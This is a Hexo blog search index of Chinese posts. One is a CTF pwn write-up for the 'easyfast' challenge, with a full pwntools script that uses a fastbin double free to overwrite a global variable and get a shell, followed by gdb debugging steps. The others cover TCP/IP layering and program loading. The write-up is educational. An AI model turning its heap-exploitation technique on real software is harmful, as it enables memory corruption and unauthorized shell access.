<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>gdb新的理解</title>
    <url>/2025/11/12/gdb/</url>
    <content><![CDATA[<h1 id="gdb新的理解"><a href="#gdb新的理解" class="headerlink" title="gdb新的理解"></a>gdb新的理解</h1><h2 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h2><p>其实感觉之前一直有gdb调试恐惧症。</p>
<p>但是通过最近的练习和复现，对gdb有了一些新的理解与感悟。</p>
<p>之前常常因为搞不清楚调试的位置，不知道怎么查看想看的程序执行情况而苦恼。</p>
<p>通过最近的联系理解了断点的重要性，以及一些新的gdb指令。</p>
<p>希望可以一直进步下去！！！</p>
<p>新学会了用python交互模式进行gdb的单步调试</p>
<p>下面以一个简单的uaf堆题为例：</p>
<h2 id="题目（buuctf-easyfast）"><a href="#题目（buuctf-easyfast）" class="headerlink" title="题目（buuctf easyfast）:"></a>题目（buuctf easyfast）:</h2><h3 id="menu"><a href="#menu" class="headerlink" title="menu:"></a>menu:</h3><p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/gdb1.png" alt="gdb1"></p>
<h3 id="creat"><a href="#creat" class="headerlink" title="creat:"></a>creat:</h3><p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251112145102620.png" alt="image-20251112145102620"></p>
<h3 id="shell"><a href="#shell" class="headerlink" title="shell:"></a>shell:</h3><p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/gdb2.png" alt="gdb2"></p>
<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251112145421701.png" alt="image-20251112145421701"></p>
<p>这里可以看到data段的全局变量<strong>602090</strong>初始的时候是<strong>1</strong></p>
<h3 id="delete"><a href="#delete" class="headerlink" title="delete:"></a>delete:</h3><p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251112145252356.png" alt="image-20251112145252356"></p>
<p>这里存在一个 **uaf **漏洞。</p>
<h3 id="edit"><a href="#edit" class="headerlink" title="edit:"></a>edit:</h3><p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251112145305907.png" alt="image-20251112145305907"></p>
<h3 id="思路："><a href="#思路：" class="headerlink" title="思路："></a>思路：</h3><p>这里的思路就是利<u>doublefree</u>或者 <u>uaf</u> 将 全局变量<strong>602090</strong>变为0</p>
<h2 id="脚本："><a href="#脚本：" class="headerlink" title="脚本："></a>脚本：</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line"><span class="comment"># [+] 环境配置</span></span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p = process(<span class="string">&#x27;./easyfast&#x27;</span>)  <span class="comment"># 本地调试</span></span><br><span class="line"><span class="comment"># p = remote(&#x27;target.ip&#x27;, port)  # 远程连接</span></span><br><span class="line"></span><br><span class="line">target = <span class="number">0x602090</span>  <span class="comment"># 目标地址（如 GOT 表）</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># [+] 堆操作函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">alloc</span>(<span class="params">size</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;申请堆块&quot;&quot;&quot;</span></span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;choice&gt;&#x27;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;size&gt;&#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;释放堆块&quot;&quot;&quot;</span></span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;choice&gt;&#x27;</span>, <span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;index&gt;&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fill</span>(<span class="params">index, content</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;填充堆块内容&quot;&quot;&quot;</span></span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;choice&gt;&#x27;</span>, <span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;index&gt;&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shell</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;触发漏洞函数&quot;&quot;&quot;</span></span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;choice&gt;&#x27;</span>, <span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># [+] Exploit 流程</span></span><br><span class="line">alloc(<span class="number">0x40</span>)  <span class="comment"># 申请两个 0x50 大小的堆块（0x40 + header）</span></span><br><span class="line">alloc(<span class="number">0x40</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># [+] 构造 Double Free</span></span><br><span class="line">free(<span class="number">0</span>)      <span class="comment"># 释放 chunk 0</span></span><br><span class="line">free(<span class="number">1</span>)      <span class="comment"># 释放 chunk 1</span></span><br><span class="line">free(<span class="number">0</span>)      <span class="comment"># 再次释放 chunk 0，形成 fastbin 链表：0 -&gt; 1 -&gt; 0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># [+] 控制 fastbin 链表头</span></span><br><span class="line">payload = p64(target - <span class="number">0x10</span>)  <span class="comment"># 指向目标地址 - 0x10（chunk header）</span></span><br><span class="line">fill(<span class="number">0</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># [+] 重新分配，控制目标地址附近的内存</span></span><br><span class="line">alloc(<span class="number">0x40</span>)  <span class="comment"># 分配到原 chunk 0 位置</span></span><br><span class="line">alloc(<span class="number">0x40</span>)  <span class="comment"># 分配到原 chunk 1 位置，此时其 fd 指向 target-0x10</span></span><br><span class="line">alloc(<span class="number">0x40</span>)  <span class="comment"># 分配到 target-0x10 附近，可以覆盖目标</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># [+] 覆盖目标内容（如 GOT 表项）</span></span><br><span class="line">payload = p64(<span class="number">0</span>)  <span class="comment"># 或者 system(&quot;/bin/sh&quot;) 的地址</span></span><br><span class="line">fill(<span class="number">3</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># [+] 触发漏洞</span></span><br><span class="line">shell()</span><br><span class="line"></span><br><span class="line"><span class="comment"># [+] 交互</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="动态调试part1："><a href="#动态调试part1：" class="headerlink" title="动态调试part1："></a><strong>动态调试part1</strong>：</h2><ul>
<li>首先开启一个<strong>python3</strong> 解释器:</li>
</ul>
<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251112150609622.png" alt="image-20251112150609622"></p>
<p>这里同时也可以看到我们启动了一个进程72687</p>
<ul>
<li>同时开启另一个<strong>gdb</strong>终端：</li>
</ul>
<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251112151018331.png" alt="image-20251112151018331"></p>
<p><code>attach (pid)</code>在gdb里面附件进程。</p>
<ul>
<li>设置关键断点：</li>
</ul>
<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/QQ_1762932098054.png" alt="QQ_1762932098054"></p>
<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/QQ_1762932109240.png" alt="QQ_1762932109240"></p>
<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/QQ_1762932126635.png" alt="QQ_1762932126635"></p>
<p>在三个关键函数的返回处设置断点</p>
<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/QQ_1762932409290.png" alt="QQ_1762932409290"></p>
<p>然后continue等待解释器输入</p>
<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/QQ_1762932489263.png" alt="QQ_1762932489263"></p>
<ul>
<li>开始进行单步调试：</li>
</ul>
<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/QQ_1762932787984.png" alt="QQ_1762932787984"></p>
<p>这里定义函数</p>
<p>然后下面我们执行了<code>alloc(0x40)</code>创建了0x40大小的堆块</p>
<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/QQ_1762932811796.png" alt="QQ_1762932811796"></p>
<p>这里可以看到右边的终端停在了我们设置的断点</p>
<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251112153558163.png" alt="image-20251112153558163"></p>
<p>这里也可以看到我们的堆块创建成功。</p>
<p>这样调试可以看到每步的执行情况。</p>
<p>每次进入<code>Continuing.</code>等待执行时候在python解释器执行新的指令</p>
<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251112153909048.png" alt="image-20251112153909048"></p>
<p>这里看到成功把<code>chunk0</code>的<code>fd</code>改为<code>全局变量-0x10</code>,然后后面通过edit就可以修改这个伪造的堆块，也就是我们需要利用全局变量</p>
<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251112154622804.png" alt="image-20251112154622804"></p>
<p>查看全局变量<code>buf</code></p>
<p>可以看到我们的目标地址被当作了一个堆块。后面就修改堆块3即可。</p>
<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251112155101849.png" alt="image-20251112155101849"></p>
<p>这里可以看到我们成功启动了shell的进程：</p>
<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251112155456001.png" alt="image-20251112155456001"></p>
<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251112155433697.png" alt="image-20251112155433697"></p>
<p><strong>注意</strong>：</p>
<p><code>ctrl + d </code>退出python解释器</p>
<p>想看执行情况可以随时<code>ctrl + c</code>暂停gdb终端</p>
<h2 id="动态调试part2："><a href="#动态调试part2：" class="headerlink" title="动态调试part2："></a><strong>动态调试part2</strong>：</h2><p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251112162347772.png" alt="image-20251112162347772"></p>
<p>这里可以看到我们进入了<code>interactive mode</code></p>
<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251112162428445.png" alt="image-20251112162428445"></p>
<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251112162453383.png" alt="image-20251112162453383"></p>
<p>继续4执行<code>shell()</code>成功</p>
<p>同时可以利用<code>interactive mode</code>和<code>gdb.attach()</code></p>
<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251112162721541.png" alt="image-20251112162721541"></p>
<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251112162730716.png" alt="image-20251112162730716"></p>
<p>这里就是说当写脚本的时候可以利用<code>interactive mode</code> 继续往下执行<code>gdb.attach</code>后面的内容。</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>PWN</tag>
      </tags>
  </entry>
  <entry>
    <title>TCP/IP 协议栈的分层结构</title>
    <url>/2025/07/26/TCP-IP-%E5%8D%8F%E8%AE%AE%E6%A0%88%E7%9A%84%E5%88%86%E5%B1%82%E7%BB%93%E6%9E%84/</url>
    <content><![CDATA[<p>TCP&#x2F;IP 协议栈</p>
<p>TCP&#x2F;IP 协议栈是互联网的核心通信框架，它定义了计算机之间如何通过网络进行数据传输的一系列规则。这个协议栈采用分层结构设计，将复杂的网络通信过程分解为多个独立的功能层，每层专注于特定任务，并通过接口与上下层协作。</p>
<h3 id="TCP-IP-协议栈的分层结构（4-层模型）"><a href="#TCP-IP-协议栈的分层结构（4-层模型）" class="headerlink" title="TCP&#x2F;IP 协议栈的分层结构（4 层模型）"></a>TCP&#x2F;IP 协议栈的分层结构（4 层模型）</h3><p>通常将 TCP&#x2F;IP 协议栈分为 4 层（从底层到上层），每层包含不同的协议，共同完成数据的封装、传输和解析：</p>
<h4 id="1-网络接口层（Network-Interface-Layer）"><a href="#1-网络接口层（Network-Interface-Layer）" class="headerlink" title="1. 网络接口层（Network Interface Layer）"></a>1. 网络接口层（Network Interface Layer）</h4><ul>
<li><p><strong>作用</strong>：负责将数据通过物理网络（如以太网、Wi-Fi）传输，处理硬件相关的通信细节。</p>
</li>
<li><p>核心协议 &#x2F; 技术</p>
<p>：</p>
<ul>
<li>以太网（Ethernet）：定义了局域网内数据传输的帧格式（包含 MAC 地址、校验码等）。</li>
<li>Wi-Fi（802.11 协议）：无线局域网的通信标准。</li>
<li>ARP（地址解析协议）：将 IP 地址转换为物理 MAC 地址，用于局域网内设备定位。</li>
</ul>
</li>
<li><p><strong>数据单元</strong>：帧（Frame）</p>
</li>
</ul>
<h4 id="2-网络层（Internet-Layer）"><a href="#2-网络层（Internet-Layer）" class="headerlink" title="2. 网络层（Internet Layer）"></a>2. 网络层（Internet Layer）</h4><ul>
<li><p><strong>作用</strong>：负责跨网络（如局域网到广域网）的数据路由和转发，确保数据从源设备能找到目标地址。</p>
</li>
<li><p>核心协议</p>
<p>：</p>
<ul>
<li>IP（网际协议）：最核心的协议，定义了 IP 地址（如 IPv4、IPv6），负责数据的分组和路由。</li>
<li>ICMP（互联网控制消息协议）：用于网络诊断（如 <code>ping</code> 命令通过 ICMP 检测主机可达性）。</li>
<li>IGMP（互联网组管理协议）：用于多播通信（如视频会议）。</li>
</ul>
</li>
<li><p><strong>数据单元</strong>：数据包（Packet）</p>
</li>
</ul>
<h4 id="3-传输层（Transport-Layer）"><a href="#3-传输层（Transport-Layer）" class="headerlink" title="3. 传输层（Transport Layer）"></a>3. 传输层（Transport Layer）</h4><ul>
<li><p><strong>作用</strong>：提供端到端的可靠数据传输，处理数据的分段、重组、流量控制等。</p>
</li>
<li><p>核心协议</p>
<p>：</p>
<ul>
<li>TCP（传输控制协议）：面向连接的可靠协议，通过三次握手建立连接、序列号保证顺序、重传机制处理丢包，适用于对可靠性要求高的场景（如网页、文件传输）。</li>
<li>UDP（用户数据报协议）：无连接的不可靠协议，不保证数据到达顺序和完整性，但但传输速度快，适用于实时性要求高的场景（如视频通话、游戏）。</li>
</ul>
</li>
<li><p><strong>数据单元</strong>：TCP 称为段（Segment），UDP 称为数据报（Datagram）</p>
</li>
</ul>
<h4 id="4-应用层（Application-Layer）"><a href="#4-应用层（Application-Layer）" class="headerlink" title="4. 应用层（Application Layer）"></a>4. 应用层（Application Layer）</h4><ul>
<li><p><strong>作用</strong>：直接为用户应用程序提供服务，定义了数据交互的格式和规则。</p>
</li>
<li><p>核心协议</p>
<p>：</p>
<ul>
<li>HTTP&#x2F;HTTPS：用于 Web 页面传输（如浏览器访问网站）。</li>
<li>FTP&#x2F;SFTP：用于文件传输。</li>
<li>SMTP&#x2F;POP3&#x2F;IMAP：用于邮件发送和接收。</li>
<li>DNS：用于将域名（如 <code>example.com</code>）解析为 IP 地址。</li>
<li>SSH&#x2F;Telnet：用于远程登录服务器。</li>
</ul>
</li>
<li><p><strong>数据单元</strong>：数据（Data）</p>
</li>
</ul>
<h3 id="数据传输的封装与解封装过程"><a href="#数据传输的封装与解封装过程" class="headerlink" title="数据传输的封装与解封装过程"></a>数据传输的封装与解封装过程</h3><p>TCP&#x2F;IP 协议栈通过 “封装” 和 “解封装” 实现数据传输，以浏览器访问网站为例：</p>
<ol>
<li><strong>封装（发送端）</strong>：<ul>
<li>应用层：浏览器生成 HTTP 请求数据（如 <code>GET /index.html</code>）。</li>
<li>传输层：TCP 为数据添加头部（源端口、目标端口、序列号等），形成 TCP 段。</li>
<li>网络层：IP 为 TCP 段添加头部（源 IP、目标 IP、路由信息等），形成 IP 数据包。</li>
<li>网络接口层：以太网为 IP 包添加头部（源 MAC、目标 MAC）和尾部（校验码），形成帧，通过物理介质（网线 &#x2F; Wi-Fi）发送。</li>
</ul>
</li>
<li><strong>解封装（接收端）</strong>：<ul>
<li>网络接口层：接收帧，校验并移除以太网头部，将 IP 数据包交给网络层。</li>
<li>网络层：解析 IP 头部，确认目标 IP 匹配后，移除 IP 头部，将 TCP 段交给传输层。</li>
<li>传输层：TCP 验证序列号，重组分段数据，移除 TCP 头部，将 HTTP 数据交给应用层。</li>
<li>应用层：服务器解析 HTTP 请求，处理后返回响应，重复封装过程回传客户端。</li>
</ul>
</li>
</ol>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>TCP&#x2F;IP 协议栈是互联网的 “交通规则”，通过分层设计实现了功能解耦：</p>
<ul>
<li>底层（网络接口层、网络层）负责 “数据怎么传”（物理传输、路由）；</li>
<li>上层（传输层、应用层）负责 “传什么数据”（可靠传输、应用交互）。</li>
</ul>
<p>这种结构使得不同厂商的设备（如电脑、路由器、服务器）能遵循统一标准通信，是互联网互联互通的基础。</p>
<p>我们以日常生活中 **“浏览网页（HTTP 请求）”<strong>为例，详细说明 TCP&#x2F;IP 协议栈各层（应用层、传输层、网络层、网络接口层）的协作关系，以及数据在各层之间的</strong>封装、传递、解封装 ** 过程。</p>
<h3 id="场景：用户在浏览器输入www-example-com并回车，请求加载网页"><a href="#场景：用户在浏览器输入www-example-com并回车，请求加载网页" class="headerlink" title="场景：用户在浏览器输入www.example.com并回车，请求加载网页"></a>场景：用户在浏览器输入<code>www.example.com</code>并回车，请求加载网页</h3><h4 id="步骤-1：应用层（HTTP-协议）生成数据"><a href="#步骤-1：应用层（HTTP-协议）生成数据" class="headerlink" title="步骤 1：应用层（HTTP 协议）生成数据"></a>步骤 1：应用层（HTTP 协议）生成数据</h4><ul>
<li><p><strong>功能</strong>：应用层负责处理用户的具体需求（这里是 “获取网页内容”），使用 HTTP 协议定义数据格式。</p>
</li>
<li><p>过程</p>
<p>：</p>
<p>浏览器（应用层程序）生成一个 HTTP 请求报文，内容大致如下：</p>
<p>plaintext</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /index.html HTTP/1.1  </span><br><span class="line">Host: www.example.com  </span><br><span class="line">User-Agent: Chrome/100.0.0.0  </span><br></pre></td></tr></table></figure>





<p>这部分是 “原始数据”，需要交给下层（传输层）处理。</p>
</li>
</ul>
<h4 id="步骤-2：传输层（TCP-协议）封装：添加-“端口信息”"><a href="#步骤-2：传输层（TCP-协议）封装：添加-“端口信息”" class="headerlink" title="步骤 2：传输层（TCP 协议）封装：添加 “端口信息”"></a>步骤 2：传输层（TCP 协议）封装：添加 “端口信息”</h4><ul>
<li><p><strong>功能</strong>：传输层负责 “端到端” 的可靠传输（TCP 是可靠协议），通过<strong>端口号</strong>区分同一设备上的不同应用（如浏览器用 80&#x2F;443 端口，QQ 用其他端口）。</p>
</li>
<li><p>过程</p>
<p>：</p>
<p>传输层（TCP）会在 HTTP 数据前添加一个</p>
<p>TCP 头部</p>
<p>，包含：</p>
<ul>
<li>源端口（浏览器随机分配，如<code>54321</code>）：标记 “哪个应用发送的”；</li>
<li>目标端口（<code>80</code>，HTTP 默认端口）：标记 “目标服务器的哪个应用接收”；</li>
<li>序列号、确认号：用于确保数据有序、不丢失（TCP 的 “可靠” 特性）。<br>此时数据单元称为<strong>TCP 段（Segment）</strong>，交给下层（网络层）。</li>
</ul>
</li>
</ul>
<h4 id="步骤-3：网络层（IP-协议）封装：添加-“IP-地址信息”"><a href="#步骤-3：网络层（IP-协议）封装：添加-“IP-地址信息”" class="headerlink" title="步骤 3：网络层（IP 协议）封装：添加 “IP 地址信息”"></a>步骤 3：网络层（IP 协议）封装：添加 “IP 地址信息”</h4><ul>
<li><p><strong>功能</strong>：网络层负责 “跨网络路由”，通过<strong>IP 地址</strong>确定数据的传输路径（从用户设备到目标服务器）。</p>
</li>
<li><p>过程</p>
<p>：</p>
<p>网络层（IP）在 TCP 段前添加</p>
<p>IP 头部</p>
<p>，包含：</p>
<ul>
<li>源 IP 地址（用户设备的 IP，如<code>192.168.1.100</code>）；</li>
<li>目标 IP 地址（<code>www.example.com</code>对应的 IP，如<code>93.184.216.34</code>，通过 DNS 解析获得）；</li>
<li>协议类型（此处为<code>6</code>，表示上层是 TCP）。<br>此时数据单元称为<strong>IP 数据包（Packet）</strong>，交给下层（网络接口层）。</li>
</ul>
</li>
</ul>
<h4 id="步骤-4：网络接口层（以太网协议）封装：添加-“MAC-地址信息”"><a href="#步骤-4：网络接口层（以太网协议）封装：添加-“MAC-地址信息”" class="headerlink" title="步骤 4：网络接口层（以太网协议）封装：添加 “MAC 地址信息”"></a>步骤 4：网络接口层（以太网协议）封装：添加 “MAC 地址信息”</h4><ul>
<li><p><strong>功能</strong>：网络接口层负责 “物理介质传输”，通过<strong>MAC 地址</strong>在局域网内识别设备（如路由器、交换机）。</p>
</li>
<li><p>过程</p>
<p>：</p>
<p>网络接口层（以太网）在 IP 数据包前添加</p>
<p>以太网头部</p>
<p>，包含：</p>
<ul>
<li>源 MAC 地址（用户设备的网卡 MAC，如<code>00:1A:2B:3C:4D:5E</code>）；</li>
<li>目标 MAC 地址（局域网内下一跳设备的 MAC，通常是路由器的 MAC，如<code>AA:BB:CC:DD:EE:FF</code>）；</li>
<li>类型（<code>0x0800</code>，表示上层是 IP 协议）。<br>同时在数据尾部添加<strong>帧校验序列（FCS）</strong>，用于校验数据传输是否出错。<br>此时数据单元称为<strong>以太网帧（Frame）</strong>，通过物理介质（网线 &#x2F; Wi-Fi）发送。</li>
</ul>
</li>
</ul>
<h4 id="步骤-5：数据在网络中传输（路由转发）"><a href="#步骤-5：数据在网络中传输（路由转发）" class="headerlink" title="步骤 5：数据在网络中传输（路由转发）"></a>步骤 5：数据在网络中传输（路由转发）</h4><ul>
<li>以太网帧从用户设备发送到路由器，路由器解析以太网头部（验证 MAC 地址是否匹配），然后移除以太网头部，提取 IP 数据包。</li>
<li>路由器根据 IP 头部的 “目标 IP 地址”（<code>93.184.216.34</code>）查询路由表，确定下一跳设备（可能是其他路由器），重新封装新的以太网帧（目标 MAC 地址改为下一跳设备的 MAC），继续转发。</li>
<li>经过多跳路由后，数据最终到达<code>www.example.com</code>所在的服务器局域网。</li>
</ul>
<h4 id="步骤-6：接收端（服务器）解封装：逐层还原数据"><a href="#步骤-6：接收端（服务器）解封装：逐层还原数据" class="headerlink" title="步骤 6：接收端（服务器）解封装：逐层还原数据"></a>步骤 6：接收端（服务器）解封装：逐层还原数据</h4><p>服务器收到数据后，按 “从下到上” 的顺序解封装：</p>
<ol>
<li><strong>网络接口层</strong>：验证 FCS 无误后，移除以太网头部，提取 IP 数据包，交给网络层。</li>
<li><strong>网络层</strong>：解析 IP 头部，确认目标 IP 是自己，移除 IP 头部，提取 TCP 段，交给传输层。</li>
<li><strong>传输层</strong>：解析 TCP 头部，通过目标端口（<code>80</code>）确定交给 HTTP 服务，验证序列号确保数据完整，移除 TCP 头部，提取 HTTP 请求数据，交给应用层。</li>
<li><strong>应用层</strong>：HTTP 服务处理请求，生成响应数据（网页内容），然后按上述步骤反向封装，发送回用户设备。</li>
</ol>
<h3 id="总结：各层关系的核心体现"><a href="#总结：各层关系的核心体现" class="headerlink" title="总结：各层关系的核心体现"></a>总结：各层关系的核心体现</h3><ul>
<li><strong>依赖关系</strong>：应用层（HTTP）依赖传输层（TCP）的端口标识，传输层依赖网络层（IP）的地址路由，网络层依赖网络接口层（以太网）的物理传输。</li>
<li><strong>封装 &#x2F; 解封装</strong>：发送端每层添加头部（封装），接收端每层移除头部（解封装），数据像 “剥洋葱” 一样逐层还原。</li>
<li><strong>独立性</strong>：如果用户切换网络（如从有线换 Wi-Fi），只需网络接口层调整 MAC 地址和传输介质，上层（IP&#x2F;TCP&#x2F;HTTP）无需任何修改，体现了分层设计的灵活性。</li>
</ul>
]]></content>
      <categories>
        <category>misc</category>
      </categories>
      <tags>
        <tag>misc</tag>
      </tags>
  </entry>
  <entry>
    <title>第一篇博客</title>
    <url>/2025/07/05/%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/</url>
    <content><![CDATA[<p>听说hexo很好玩</p>
]]></content>
      <categories>
        <category>hexo</category>
      </categories>
      <tags>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>程序怎么运行起来的</title>
    <url>/2025/07/17/%E7%A8%8B%E5%BA%8F%E6%80%8E%E4%B9%88%E8%BF%90%E8%A1%8C%E8%B5%B7%E6%9D%A5%E7%9A%84/</url>
    <content><![CDATA[<h2 id="四大金刚"><a href="#四大金刚" class="headerlink" title="四大金刚"></a>四大金刚</h2><p>一个二进制文件运行起来需要四个核心部件： 可执行文件，操作系统（os），内存（ram），处理器（cpu）协同操作。</p>
<h4 id="1-可执行文件（二进制文件）"><a href="#1-可执行文件（二进制文件）" class="headerlink" title="1. 可执行文件（二进制文件）"></a>1. 可执行文件（二进制文件）</h4><ul>
<li><strong>作用</strong>：程序的 “静态载体”，包含计算机可直接执行的机器指令（二进制代码）、数据（如常量、初始化变量）、以及用于加载的元信息（如文件格式、内存布局描述、入口点地址等）。</li>
<li><strong>常见格式</strong>：Windows 的 <code>.exe</code>、Linux 的 ELF（Executable and Linkable Format）、macOS 的 Mach-O 等。这些格式规定了指令和数据的组织方式，让操作系统能正确解析并加载。</li>
</ul>
<h4 id="2-操作系统（OS）"><a href="#2-操作系统（OS）" class="headerlink" title="2. 操作系统（OS）"></a>2. 操作系统（OS）</h4><ul>
<li><p>作用</p>
<p>：程序运行的 “管理者”，负责协调硬件资源并提供运行环境，核心功能包括：</p>
<ul>
<li><strong>加载程序</strong>：将可执行文件从磁盘读入内存，根据文件中的元信息（如段表）分配内存区域（代码段、数据段、栈、堆等），并设置权限（如代码段设为只读可执行）。</li>
<li><strong>进程管理</strong>：为程序创建进程（或线程），分配进程控制块（PCB）记录进程状态（如 PID、寄存器值、内存映射等），并调度进程获得处理器时间。</li>
<li><strong>资源抽象与分配</strong>：通过系统调用（如文件操作、内存分配）为程序提供统一的硬件访问接口，避免程序直接操作硬件。</li>
<li><strong>内存管理</strong>：通过虚拟内存机制将程序的逻辑地址映射到物理内存，实现内存隔离（不同程序互不干扰）和高效利用（如内存分页、交换）。</li>
</ul>
</li>
</ul>
<h4 id="3-内存（RAM）"><a href="#3-内存（RAM）" class="headerlink" title="3. 内存（RAM）"></a>3. 内存（RAM）</h4><ul>
<li><p>作用</p>
<p>：程序运行的 “临时数据空间”，用于存储程序执行过程中的指令和数据：</p>
<ul>
<li><strong>代码段（Text Segment）</strong>：存放可执行文件中的机器指令，供处理器读取并执行。</li>
<li><strong>数据段（Data Segment）</strong>：存放初始化的全局变量、静态变量（编译时已知值）。</li>
<li><strong>BSS 段</strong>：存放未初始化的全局变量、静态变量（默认初始化为 0，由操作系统在加载时分配空间）。</li>
<li><strong>栈（Stack）</strong>：存储函数参数、局部变量、返回地址等（见前文详解）。</li>
<li><strong>堆（Heap）</strong>：动态分配的内存（如<code>malloc</code>申请的空间），供程序运行时灵活使用。</li>
</ul>
</li>
</ul>
<h4 id="4-处理器（CPU）"><a href="#4-处理器（CPU）" class="headerlink" title="4. 处理器（CPU）"></a>4. 处理器（CPU）</h4><ul>
<li><p>作用</p>
<p>：程序执行的 “运算核心”，负责逐条执行内存中的机器指令：</p>
<ul>
<li>通过<strong>程序计数器（PC）</strong> 指向当前要执行的指令地址，执行后自动更新为下一条指令地址。</li>
<li>通过<strong>寄存器</strong>暂存运算数据（如累加器、地址寄存器），加速指令执行（寄存器速度远快于内存）。</li>
<li>执行指令时涉及的运算（如加减、逻辑判断）、内存访问（如读数据、写结果）、跳转（如函数调用）等操作，均由 CPU 完成。</li>
</ul>
</li>
</ul>
<h2 id="运行过程"><a href="#运行过程" class="headerlink" title="运行过程"></a>运行过程</h2><ol>
<li><strong>启动程序</strong>：用户通过操作系统（如调用系统的shell函数）触发程序运行请求。</li>
<li><strong>加载到内存</strong>：操作系统解析可执行文件（elf文件格式），根据其元信息在内存中分配空间（代码段、数据段、栈等），将文件中的指令和数据复制到对应内存区域。</li>
<li><strong>创建进程</strong>：操作系统为程序创建进程，初始化进程控制块（PCB），设置程序入口点（第一条指令的内存地址）。</li>
<li><strong>调度执行</strong>：操作系统将进程放入调度队列，当分配到 CPU 时间片时，CPU 从程序入口点开始执行指令：<ul>
<li>从内存中读取指令到 CPU，解码后执行（如运算、读写内存、调用函数等）。</li>
<li>执行过程中动态使用栈（函数调用）和堆（动态内存），操作系统负责维护内存映射和权限。</li>
</ul>
</li>
<li><strong>终止程序</strong>：程序执行完<code>main</code>函数（或调用<code>exit</code>）后，操作系统回收进程占用的内存、CPU 等资源，进程终止。</li>
</ol>
<p><strong>注意</strong> ：1.可执行文件是elf格式 启动阶段 操作系统为起分配  <strong>虚拟内存</strong>（连续）也就是在此时 堆和栈诞生（与程序的生命周期相同）其中堆需要可执行文件中具有申请堆操作 而 栈是与生俱来的。</p>
<p>2.程序启动的初期阶段（如创建进程、分配虚拟内存、设置堆栈）需要操作系统内核完成，因此代码运行在<strong>内核态</strong>。</p>
<p>3.虚拟内存加载到物理内存的过程是<strong>动态且按需发生的</strong>执行到哪加载到哪 cpu 只能处理实际地址的内容</p>
<p>4.启动程序的过程本质是将静态的可执行文件加载到系统中，并创建对应的进程</p>
]]></content>
      <tags>
        <tag>CSAPP</tag>
      </tags>
  </entry>
  <entry>
    <title>House of force</title>
    <url>/2025/11/28/House%20of%20force/</url>
